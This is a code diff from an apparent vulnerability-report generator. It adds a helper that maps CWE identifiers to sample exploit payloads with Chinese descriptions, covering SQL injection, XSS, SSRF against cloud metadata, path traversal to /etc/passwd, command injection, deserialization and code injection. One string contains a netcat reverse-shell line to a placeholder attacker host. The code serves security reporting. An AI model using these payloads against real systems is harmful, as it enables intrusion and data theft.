-        if not endpoint:
-            return ""
-
-        lines: list[str] = []
-        lines.append(f"**目标端点**: `{http_method} {endpoint}`")
-        lines.append("")
-
-        # Step 1: craft malicious payload
-        from hyqagent.report.templates import lookup_cwe_name
-
-        cwe_name = lookup_cwe_name(cwe_id) or cwe_id
-
-        if "CWE-89" in cwe_id:
-            payload = "1' OR '1'='1' --"
-            lines.append(
-                f"1. 构造 SQL 注入 payload，例如 `{payload}`"
-            )
-        elif "CWE-79" in cwe_id:
-            payload = "<script>alert(document.cookie)</script>"
-            lines.append(
-                f"1. 构造 XSS payload，例如 `{payload}`"
-            )
-        elif "CWE-918" in cwe_id:
-            lines.append(
-                "1. 将目标 URL 参数替换为内部服务地址（如 `http://169.254.169.254/latest/meta-data/`）"
-            )
-        elif "CWE-78" in cwe_id or "CWE-77" in cwe_id:
-            lines.append(
-                "1. 在输入参数中注入命令分隔符（如 `;`, `|`, `&&`），后接系统命令"
-            )
-        elif "CWE-22" in cwe_id:
-            lines.append(
-                "1. 在文件路径参数中使用 `../` 跳出预期目录，如 `../../etc/passwd`"
-            )
-        elif "CWE-502" in cwe_id:
-            lines.append(
-                "1. 使用 `ysoserial` 或类似工具生成恶意序列化 payload"
-            )
-        else:
-            lines.append(
-                f"1. 构造针对 {cwe_name} 的恶意输入"
-                if cwe_name
-                else "1. 构造针对该漏洞类型的恶意输入"
-            )
-
-        # Step 2: send request
-        param_str = ""
-        if http_params:
-            params = [p.strip() for p in http_params.split(",") if p.strip()]
-            if params:
-                param_str = "?" + "&".join(f"{p}=<payload>" for p in params)
-
-        lines.append(
-            f"2. 向 `{http_method} {endpoint}{param_str}` 发送恶意请求"
-        )
-
-        # Step 3: verify
-        lines.append("3. 观察响应——确认是否存在预期外的数据泄露或行为")
-
-        return "\n".join(lines)
+    def _format_duration(ms: int) -> str:
+        """Format a duration in milliseconds to a human-readable string."""
+        if ms < 1000:
+            return f"{ms}ms"
+        seconds = ms / 1000
+        if seconds < 60:
+            return f"{seconds:.1f}s"
+        minutes = int(seconds // 60)
+        secs = int(seconds % 60)
+        return f"{minutes}m {secs}s"
 
     @staticmethod
     def _resolve_version() -> str:
@@ -949,6 +1167,97 @@ class ReportGenerator:
         from datetime import datetime
 
         return datetime.now(UTC).isoformat()
+
+
+# ── Payload helpers ────────────────────────────────────────────────────────
+
+
+def _payload_for_vuln(cwe_id: str, vuln_type: str) -> tuple[str, str]:
+    """Return a (payload, description) pair for a given CWE / vuln type.
+
+    Used by :meth:`ReportGenerator._build_exploitation_steps` to auto-generate
+    realistic exploit payloads for the finding.
+    """
+    # Try CWE-based matching first (more specific)
+    if "CWE-89" in (cwe_id or ""):
+        return (
+            "1' OR '1'='1' --",
+            "构造 SQL 注入 payload：使用 `' OR '1'='1' --` 绕过认证，"
+            "或 `' UNION SELECT ... --` 跨表提取数据",
+        )
+    if "CWE-79" in (cwe_id or ""):
+        return (
+            "<script>alert(document.cookie)</script>",
+            "构造 XSS payload：使用 `<script>alert(document.cookie)</script>` "
+            "验证脚本注入，或 `<img src=x onerror=...>` 利用事件处理器执行代码",
+        )
+    if "CWE-918" in (cwe_id or ""):
+        return (
+            "http://169.254.169.254/latest/meta-data/",
+            "构造 SSRF payload：将目标 URL 参数替换为内部服务地址"
+            "（如 AWS IMDS `http://169.254.169.254/latest/meta-data/`）",
+        )
+    if "CWE-78" in (cwe_id or "") or "CWE-77" in (cwe_id or ""):
+        return (
+            "; cat /etc/passwd",
+            "构造命令注入 payload：使用 `;`, `|`, `&&` 分隔符注入系统命令，"
+            "如 `; cat /etc/passwd` 或 `| nc attacker.com 4444 -e /bin/sh`",
+        )
+    if "CWE-22" in (cwe_id or ""):
+        return (
+            "../../etc/passwd",
+            "构造路径遍历 payload：使用 `../` 序列跳出预期目录，"
+            "如 `../../etc/passwd` 读取系统文件",
+        )
+    if "CWE-502" in (cwe_id or ""):
+        return (
+            "rO0AB... (base64-encoded serialized object)",
+            "构造反序列化 payload：使用 ysoserial 生成恶意序列化对象，"
+            "如 `java -jar ysoserial.jar CommonsCollections6 'cmd' | base64`",
+        )
+    if "CWE-1336" in (cwe_id or ""):
+        return (
+            "{{7*7}}",
+            "构造 SSTI payload：使用 `{{7*7}}` 测试模板注入，"
+            "若输出 49 则确认漏洞存在",
+        )
+    if "CWE-94" in (cwe_id or ""):
+        return (
+            "__import__('os').system('id')",
+            "构造代码注入 payload：注入可执行的表达式或语句，"
+            "如 `__import__('os').system('id')`",
+        )
+
+    # Fallback: match by vuln_type string
+    vt = vuln_type.lower().strip()
+    if "sql" in vt:
+        return (
+            "1' OR '1'='1' --",
+            "构造 SQL 注入 payload：使用 OR-based 注入测试查询逻辑漏洞",
+        )
+    if "xss" in vt:
+        return (
+            "<script>alert(1)</script>",
+            "构造 XSS payload：使用最基本的脚本注入测试输出编码",
+        )
+    if "ssrf" in vt:
+        return (
+            "http://localhost:8080/",
+            "构造 SSRF payload：将目标 URL 替换为内部地址"
+            "（如 localhost 或内网 IP）",
+        )
+    if "path" in vt or "traversal" in vt:
+        return (
+            "../../etc/passwd",
+            "构造路径遍历 payload：使用 `../` 尝试访问预期外的文件系统路径",
+        )
+    if "command" in vt or "injection" in vt:
+        return (
+            "; id",
+            "构造命令注入 payload：使用 shell 元字符注入系统命令",
+        )
+
+    return ("<malicious input>", "构造针对此漏洞类型的恶意输入")
 
 
 # ── SARIF helpers ────────────────────────────────────────────────────────
